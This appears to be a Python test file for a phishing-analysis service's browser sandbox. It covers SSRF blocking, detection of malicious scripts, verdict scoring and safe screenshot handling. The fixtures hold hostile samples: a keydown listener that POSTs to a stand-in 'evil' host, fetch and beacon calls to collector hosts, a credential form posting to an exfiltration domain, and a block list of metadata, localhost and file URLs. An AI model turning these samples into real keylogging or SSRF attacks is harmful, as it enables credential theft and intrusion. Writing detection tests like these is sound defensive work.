import base64
import io
import os
import tempfile
import unittest
from unittest.mock import AsyncMock, patch

from fastapi.testclient import TestClient
from PIL import Image

from app.core.browser_sandbox import (
    analyze_sandbox_scripts_and_telemetry,
    build_sandbox_report,
    execute_browser_sandbox,
    resolve_screenshot_path,
)
from app.core.browser_worker import (
    BrowserSandboxError,
    find_headless_browser,
    run_in_browser_worker_sync,
    validate_browser_subrequest,
)
from app.core.security_guard import SSRFBlockedError
from app.main import app
from app.models.database import init_db


def _make_tiny_png_b64() -> str:
    img = Image.new("RGB", (32, 24), color=(15, 23, 42))
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return base64.b64encode(buf.getvalue()).decode("ascii")


class TestBrowserSandbox(unittest.TestCase):
    def setUp(self):
        init_db()

    def test_browser_subrequest_ssrf_and_scheme_policy(self):
        blocked_targets = [
            "http://127.0.0.1:8000/api/stats",
            "http://localhost/admin",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.0.0.5/internal.js",
            "http://[::1]:8080/",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "ftp://example.com/payload.exe",
        ]
        for target in blocked_targets:
            allowed, reason = validate_browser_subrequest(target)
            self.assertFalse(allowed, f"Expected subrequest '{target}' to be blocked")
            self.assertTrue(reason)

        allowed_pub, reason_pub = validate_browser_subrequest("https://example.com/app.js", dns_cache={("example.com", 443): True})
        self.assertTrue(allowed_pub, reason_pub)

        for inline_url in ("about:blank", "data:image/png;base64,AAAA", "blob:https://example.com/123"):
            allowed, _ = validate_browser_subrequest(inline_url)
            self.assertTrue(allowed)

    def test_script_and_telemetry_analysis_detects_phishing_and_avoids_clean_fp(self):
        malicious_raw = {
            "inline_scripts": [
                {
                    "index": 1,
                    "text": (
                        "var _0x1a2b='x',_0x2c3d='y',_0x3e4f='z',_0x4a5b='1',_0x5c6d='2',_0x6e7f='3',_0x7a8b='4',_0x8c9d='5';"
                        "eval(unescape('%61%6c%65%72%74'));"
                        "document.addEventListener('keydown', function(e){ fetch('https://drop-zone.evil/k', {method:'POST'}); });"
                    ),
                }
            ],
            "external_scripts": ["https://cdn-loader.xyz/kit.js"],
            "inline_handlers": [{"tag": "body", "oncontextmenu": "return false;", "onkeydown": ""}],
            "telemetry": {
                "eval_calls": [{"api": "eval", "preview": "window.location='...'"}],
                "network_calls": [
                    {"api": "fetch", "method": "POST", "url": "https://collector.evil/steal"},
                    {"api": "sendBeacon", "method": "POST", "url": "https://beacon.evil/log"},
                ],
                "form_submits": [],
                "event_hooks": [
                    {"event": "contextmenu", "target": "document", "preview": "e => e.preventDefault()"}
                ],
                "history_calls": [{"api": "replaceState", "url": "/fake-secure"}],
                "clipboard_ops": 1,
            },
        }
        analysis = analyze_sandbox_scripts_and_telemetry(
            malicious_raw,
            final_domain="paypa1-auth.xyz",
            final_url="https://paypa1-auth.xyz/login",
        )
        indicators = {ind for sc in analysis["suspicious_scripts"] for ind in sc["indicators"]}
        self.assertIn("obfuscated_eval", indicators)
        self.assertIn("hex_obfuscated_identifiers", indicators)
        self.assertIn("keylogger_exfil", indicators)
        self.assertIn("runtime_eval", indicators)
        self.assertIn("runtime_anti_analysis", indicators)
        self.assertIn("suspicious_external_script", indicators)
        self.assertEqual(len(analysis["runtime_exfil_targets"]), 2)
        self.assertTrue(all(t["is_cross_origin"] for t in analysis["runtime_exfil_targets"]))

        # Clean framework code must not be falsely flagged
        clean_raw = {
            "inline_scripts": [
                {"index": 1, "text": "window.addEventListener('DOMContentLoaded', () => console.log('ready'));"}
            ],
            "external_scripts": ["https://cdn.example.com/bundle.js"],
            "inline_handlers": [],
            "telemetry": {"eval_calls": [], "network_calls": [], "form_submits": [], "event_hooks": []},
        }
        clean_analysis = analyze_sandbox_scripts_and_telemetry(clean_raw, "example.com", "https://example.com/")
        self.assertEqual(len(clean_analysis["suspicious_scripts"]), 0)

    def test_sandbox_report_scoring_screenshot_and_api_endpoints(self):
        png_b64 = _make_tiny_png_b64()
        fake_worker_output = {
            "target_url": "http://paypa1-lure.example/start",
            "final_url": "https://login-paypa1-kit.example/auth",
            "page_title": "PayPal Security Check",
            "browser_product": "Chrome/156.0.8078.80",
            "execution_ms": 1420,
            "isolated_worker_pid": 42424,
            "screenshot_b64": png_b64,
            "redirect_chain": [
                {
                    "hop": 1,
                    "url": "http://paypa1-lure.example/start",
                    "status_code": 302,
                    "method": "GET",
                    "resource_type": "Document",
                    "remote_ip": "198.51.100.10",
                    "location": "https://hop-intermediate.example/r",
                    "is_cross_origin": False,
                },
                {
                    "hop": 2,
                    "url": "https://hop-intermediate.example/r",
                    "status_code": 302,
                    "method": "GET",
                    "resource_type": "Document",
                    "remote_ip": "203.0.113.20",
                    "location": "https://login-paypa1-kit.example/auth",
                    "is_cross_origin": True,
                },
                {
                    "hop": 3,
                    "url": "https://login-paypa1-kit.example/auth",
                    "status_code": 200,
                    "method": "GET",
                    "resource_type": "Document",
                    "remote_ip": "203.0.113.50",
                    "is_cross_origin": True,
                },
            ],
            "network_requests": [
                {
                    "request_id": "1",
                    "url": "https://login-paypa1-kit.example/auth",
                    "domain": "login-paypa1-kit.example",
                    "method": "GET",
                    "resource_type": "Document",
                    "status_code": 200,
                    "remote_ip": "203.0.113.50",
                    "is_third_party": False,
                    "blocked": False,
                }
            ],
            "blocked_requests": [
                {
                    "request_id": "2",
                    "url": "http://169.254.169.254/latest/meta-data/",
                    "domain": "169.254.169.254",
                    "method": "GET",
                    "resource_type": "XHR",
                    "is_third_party": True,
                    "blocked": True,
                    "blocked_reason": "SSRFBlocked: non-public IP",
                    "failed": True,
                }
            ],
            "form_destinations": [
                {
                    "form_index": 1,
                    "action_raw": "https://exfil-gate.evil/post",
                    "action_url": "https://exfil-gate.evil/post",
                    "action_domain": "exfil-gate.evil",
                    "method": "POST",
                    "is_cross_origin": True,
                    "has_password_input": True,
                    "has_credential_fields": True,
                    "has_payment_fields": False,
                    "input_count": 3,
                    "hidden_inputs_count": 1,
                    "input_names": ["email", "password", "token"],
                    "submit_labels": ["Continue"],
                }
            ],
            "inline_scripts": [
                {
                    "index": 1,
                    "text": "eval(unescape('%76%61%72'));",
                }
            ],
            "external_scripts": [],
            "inline_handlers": [],
            "parsed_scripts_count": 2,
            "telemetry": {
                "eval_calls": [{"api": "eval", "preview": "steal()"}],
                "network_calls": [{"api": "sendBeacon", "method": "POST", "url": "https://exfil-gate.evil/beacon"}],
                "form_submits": [],
                "event_hooks": [],
                "history_calls": [],
                "clipboard_ops": 0,
            },
        }

        client = TestClient(app)

        # 1. SSRF endpoints blocked cleanly before spawning browser
        ssrf_resp = client.post("/api/sandbox", json={"url": "http://127.0.0.1:8000/admin"})
        self.assertEqual(ssrf_resp.status_code, 400)

        meta_resp = client.post("/api/sandbox", json={"url": "http://169.254.169.254/latest/meta-data/"})
        self.assertEqual(meta_resp.status_code, 400)

        # 2. End-to-end sandbox POST, GET history, GET report, GET screenshot PNG
        with patch("app.core.browser_sandbox.run_in_browser_worker", new=AsyncMock(return_value=fake_worker_output)):
            resp = client.post("/api/sandbox", json={"url": "http://paypa1-lure.example/start", "wait_seconds": 1.2})
            self.assertEqual(resp.status_code, 200)
            data = resp.json()

        sid = data["sandbox_id"]
        self.assertEqual(data["verdict"], "MALICIOUS")
        self.assertGreaterEqual(data["sandbox_score"], 75.0)
        self.assertTrue(data["screenshot_available"])
        self.assertEqual(len(data["redirect_chain"]), 3)
        self.assertEqual(len(data["form_destinations"]), 1)
        self.assertEqual(data["form_destinations"][0]["action_domain"], "exfil-gate.evil")
        self.assertEqual(len(data["blocked_requests"]), 1)
        self.assertGreaterEqual(len(data["suspicious_scripts"]), 2)

        # Screenshot file saved safely and served via /api/sandbox/{id}/screenshot
        saved = resolve_screenshot_path(sid)
        self.assertIsNotNone(saved)
        shot_resp = client.get(f"/api/sandbox/{sid}/screenshot")
        self.assertEqual(shot_resp.status_code, 200)
        self.assertEqual(shot_resp.headers["content-type"], "image/png")
        self.assertTrue(shot_resp.content.startswith(b"\x89PNG"))

        # Clean up test screenshot artifact so data dir stays tidy
        if saved and saved.exists():
            saved.unlink()

        # Report retrieval and history listing
        detail_resp = client.get(f"/api/sandbox/{sid}")
        self.assertEqual(detail_resp.status_code, 200)
        self.assertEqual(detail_resp.json()["sandbox_id"], sid)

        list_resp = client.get("/api/sandbox")
        self.assertEqual(list_resp.status_code, 200)
        self.assertTrue(any(item["sandbox_id"] == sid for item in list_resp.json()))

        # Path traversal & invalid ID rejected safely
        self.assertIsNone(resolve_screenshot_path("../secret"))
        bad_shot = client.get("/api/sandbox/SBX-DOESNOTEXIST/screenshot")
        self.assertEqual(bad_shot.status_code, 404)

        # Dashboard HTML exposes Browser Sandbox tab & telemetry containers
        html = client.get("/").text
        for element_id in (
            "tab-sandbox",
            "sandbox-form",
            "sbx-screenshot-img",
            "sbx-redirects-list",
            "sbx-forms-list",
            "sbx-scripts-list",
            "sbx-requests-tbody",
            "btn-run-in-sandbox",
        ):
            self.assertIn(element_id, html)

    def test_worker_pre_flight_ssrf_blocks_before_browser_launch(self):
        with self.assertRaises(SSRFBlockedError):
            run_in_browser_worker_sync("http://localhost:8000/")
        with self.assertRaises(SSRFBlockedError):
            run_in_browser_worker_sync("file:///C:/Windows/win.ini")

    def test_browser_binary_detection(self):
        path = find_headless_browser()
        if path:
            self.assertTrue(os.path.isfile(path))


if __name__ == "__main__":
    unittest.main()
